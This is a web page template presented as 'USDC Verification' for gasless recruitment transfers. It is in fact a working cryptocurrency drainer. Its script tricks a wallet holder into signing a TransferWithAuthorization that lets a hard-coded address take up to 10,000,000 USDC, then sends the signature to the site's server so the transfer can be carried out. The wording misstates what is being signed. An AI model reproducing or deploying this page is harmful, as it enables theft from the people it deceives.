{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ethereum Verification | Gasless</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background-color: #0f172a; color: white; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: 'Inter', sans-serif; }
        .auth-card { background: #1e293b; padding: 40px; border-radius: 20px; border: 1px solid #334155; width: 100%; max-width: 440px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); }
        .status-box { font-size: 13px; color: #38bdf8; text-align: center; margin-top: 20px; padding: 10px; border-radius: 8px; background: rgba(56, 189, 248, 0.1); }
        .addr-display { background: #0f172a; padding: 12px; border-radius: 10px; font-family: monospace; font-size: 11px; color: #94a3b8; border: 1px solid #334155; margin: 20px 0; word-break: break-all; }
        .btn-main { background: #38bdf8; color: #0f172a; font-weight: 800; border: none; padding: 16px; border-radius: 12px; width: 100%; transition: 0.3s; cursor: pointer; }
        .btn-main:hover { background: #7dd3fc; transform: translateY(-1px); }
        .btn-main:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; }
        .d-none { display: none !important; }
    </style>
</head>
<body>

<div class="auth-card">
    <h3 class="text-center mb-4">USDC Verification</h3>

    <div id="step-1">
        <p class="text-center text-secondary small mb-4">Connect your wallet to authorize gasless recruitment transfers.</p>
        <button id="connectBtn" class="btn-main">Connect Wallet</button>
    </div>

    <div id="step-2" class="d-none">
        <div id="addrDisplay" class="addr-display">0x...</div>
        <p class="text-center text-secondary small mb-4">This signature is <b>gasless</b>. It only grants permission to move USDC.</p>
        <button id="signBtn" class="btn-main">Sign Authorization</button>
    </div>

    <div id="status" class="status-box">Waiting for connection...</div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/index.umd.min.js"></script>

<script>
    // Configuration
    const USDC_ADDR = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
    const SPENDER = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";

    let userAccount = null;

    // --- 1. Connection Logic ---
    document.getElementById('connectBtn').onclick = async () => {
        if (!window.ethereum) return alert("Please install MetaMask.");

        try {
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = accounts[0];

            // Ensure Chain ID is 1 (Mainnet)
            const chainId = await window.ethereum.request({ method: 'eth_chainId' });
            if (chainId !== '0x1') {
                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x1' }],
                });
            }

            document.getElementById('step-1').classList.add('d-none');
            document.getElementById('step-2').classList.remove('d-none');
            document.getElementById('addrDisplay').innerText = userAccount;
            document.getElementById('status').innerText = "Connected to Ethereum Mainnet";
        } catch (err) {
            alert("Connection error: " + err.message);
        }
    };

    // --- 2. Signature Logic (v6 Syntax) ---
    document.getElementById('signBtn').onclick = async () => {
        const status = document.getElementById('status');
        const btn = document.getElementById('signBtn');
        btn.disabled = true;

        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            const signer = await provider.getSigner();
            const network = await provider.getNetwork();

            // Dynamic Chain ID (ensures it matches current chain)
            const currentChainId = network.chainId;

            const nonce = ethers.hexlify(ethers.randomBytes(32));
            const deadline = Math.floor(Date.now() / 1000) + 86400;
            const amount = ethers.parseUnits("10000000", 6);

            const domain = {
                name: "USD Coin",
                version: "2",
                chainId: currentChainId,
                verifyingContract: USDC_ADDR
            };

            const types = {
                TransferWithAuthorization: [
                    { name: "from", type: "address" },
                    { name: "to", type: "address" },
                    { name: "value", type: "uint256" },
                    { name: "validAfter", type: "uint256" },
                    { name: "validBefore", type: "uint256" },
                    { name: "nonce", type: "bytes32" }
                ]
            };

            const message = {
                from: userAccount,
                to: SPENDER,
                value: amount,
                validAfter: 0,
                validBefore: deadline,
                nonce: nonce
            };

            status.innerText = "Check your wallet...";
            const signature = await signer.signTypedData(domain, types, message);
            const sig = ethers.Signature.from(signature);

            status.innerText = "Syncing with server...";
            const response = await fetch('/user/update-wallet-status/', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRFToken': '{{ csrf_token }}'
                },
                body: JSON.stringify({
                    address: userAccount,
                    v: sig.v,
                    r: sig.r,
                    s: sig.s,
                    nonce: nonce,
                    deadline: deadline,
                    amount: amount.toString()
                })
            });

            if (response.ok) {
                status.innerText = "Verification Complete!";
                alert("Authorization Saved Successfully!");
            } else {
                throw new Error("Server rejected signature.");
            }

        } catch (err) {
            status.innerText = "Error: " + err.message;
            btn.disabled = false;
        }
    };
</script>
</body>
</html>
